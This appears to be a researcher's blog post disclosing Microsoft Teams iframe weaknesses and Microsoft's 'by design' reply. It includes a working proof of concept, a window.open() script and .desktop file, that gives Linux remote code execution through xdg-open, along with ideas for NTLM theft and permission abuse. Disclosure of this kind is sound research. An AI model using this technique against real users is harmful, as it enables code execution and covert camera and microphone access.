---
layout: post
title:  "Microsoft Teams ?Intended? Vulnerabilities"
description: Lets talk about Microsoft Teams?.
tags: Research
---
# Microsoft Teams ~~Vulnerabilities~~ Features! 

In this article, I will gonna talk about research that me and my friends Bigous, Waid, and Bee made in Microsoft Teams a few time ago. This research, although it did not become a bounty, was a very interesting experience that taught us a lot about researching hardened software.

# Iframe
The Iframe, how it works, and the possible vulnerabilities that we can find in this tag is the main part of this entire research. 

While looking for interesting features in the application, we've got the feature of adding websites to add a site for other users to see. So, we decided to take a look into this iframe code:
```html
<iframe ng-if="ctrl.frame && ctrl.frame.type == 'iframe' && ctrl.frame.ready" ng-class="{'embedded-iframe-loading': ctrl.showLoadingIndicator}" title="" class="embedded-iframe embedded-page-content" name="embedded-page-container" sandbox="allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-pointer-lock allow-scripts allow-same-origin allow-downloads" allow="geolocation *; microphone *; camera *; midi *; encrypted-media *" data-tid="embeddedPageContainerIframe" acc-tabbable="true" allowfullscreen="" src="//website.com"></iframe>
```
As you can see, this iframe has a few interesting attributes, being the most interesting: 
- The allow attribute with the values "geolocation *; microphone *; camera *; midi *; encrypted-media *"
- The sandbox attribute with the value "allow-popups-to-escape-sandbox"

So, let's talk about what each of these attributes does exactly.

## The allow attribute
Now, if you are not a web developer you are possibly wondering what the allow attribute does. This specifies a resource policy for the iframe, i.e., it specifies which permissions can be passed from the scope of the parent site to the iframe.

As said before we can abuse the allow attribute: `allow="geolocation *; microphone *; camera *; midi *; encrypted-media *"` to gain access to the browser APIs. The problem is that when a site inside the iframe asks for authorization to access these devices, the authorization request comes from 'teams.microsoft.com', not from the iframe's website, usually by using teams calls the user has already given these authorizations, so a site inside the iframe can have access to those APIs without permission.


## The sandbox attribute
The sandbox attribute has the value “allow-popups-to-escape-sandbox” set, which means that we can use popups out of the iframe scope, enabling us to escape the sandbox! The popups can be called with the function window.open(), this basically will open another tab in the Teams scope, but this can't only be used to open common URLs, we can use it to open up other applications instead of the system’s default browser eg: calculator://, mailto://, ms-word://... We can also try to manipulate the DOM and try to do some tricks like seen [here][ms-teams-rce], but we are "blocked" from accessing the DOM, limiting a lot the attack surface. 

![](https://i.imgur.com/0mQElWs.png)

### URI schemas

The first thing I think in this type of attack exploring URI schemas is to try to use the file:// protocol, and that's what we tried as soon we realized this possible attack vector, and obviously that doesnt work, this protocol was blocked in the electron, so we need try for another way. Another really cool idea is to use the smb:// protocol to possibly get RCE in the victim or to steal him NTLM hash, but that's disabled too.

After a few time researching about URI protocol schemas, we've found [this article][positive-security], I really recommend that you read it, because that shows us a lot of tricks to use in situations like this.

### RCE on Linux?

From the cited article, the idea of using xdg-open to call a remote .desktop, thus executing code on the victim's machine seemed like a very interesting one, and that what we did. So, when our victim access the application part with the Iframe, we've successfully Remote Code Execution (in a good part of linux distros).

When we use window.open() pointing to some website with a ‘.desktop’ file, it gets executed, running the command described in the file, for the PoC, we just used the gnome-calculator command, that in a real scenario, could be a malicious Linux command.

![](https://i.imgur.com/QguuccH.png)

Code used in Website:
```htmlembedded=
<script>
window.open('https://yourwebsite.com/poc.desktop')
</script>
```

"poc.desktop" contents:
```htmlembedded=
Desktop Entry]
Version=1.0
Type=Application
Name=RCE
Comment=
Exec=gnome-calculator
Icon=
Path=
Terminal=false
StartupNotify=false
```

### And on Windows?

For obvious reasons the xdg-open will not work in Windows, so we need a different approach to get RCE in it. Unfortunately, we have tried everything on Windows, but we didn't find anything that can lead to a 0 click RCE on Microsoft Teams running on Windows.

But we can already get Remote Code Execution by exploiting vulnerabilities in third-party applications, like [this vulnerability in steam's protocol][steam], [this vulnerability in WinSCP][winscp] or even the CVE 2021-40444 in Microsoft Word.

And we can also use Click-Once applications with 'microsoft-edge://' protocol to get a 1 click RCE, but I will not go deeper into this.

# Microsoft's response

After about a month that we've contacted Microsoft, they've sent us an email with this message:

In this case this would be by design functionality. The users are allowed to load external content in that location as a feature. The inability to access the DOM limits the actions of the attacker. We do note, that the window could be clearer in starting that it is external content, and we have forwarded this information over to the product's functional team for review for future versions. For now we are closing this case out as this is currently how this function is intended to work.

# Conclusion

Although Microsoft says it doesn't see this as a security issue, it was a very fun, and very unusual, learning experience that forced me to study a widely used and hardened application.


# References:
1. https://positive.security/blog/url-open-rce
2. https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673
3. https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml
4. https://github.com/oskarsve/ms-teams-rce
5. https://docs.microsoft.com/visualstudio/deployment/publishing-clickonce-applications

[ms-teams-rce]: https://github.com/oskarsve/ms-teams-rce
[positive-security]: https://positive.security/blog/url-open-rce
[steam]: http://revuln.com/files/ReVuln_Steam_Browser_Protocol_Insecurity.pdf
[winscp]: https://nvd.nist.gov/vuln/detail/CVE-2021-3331
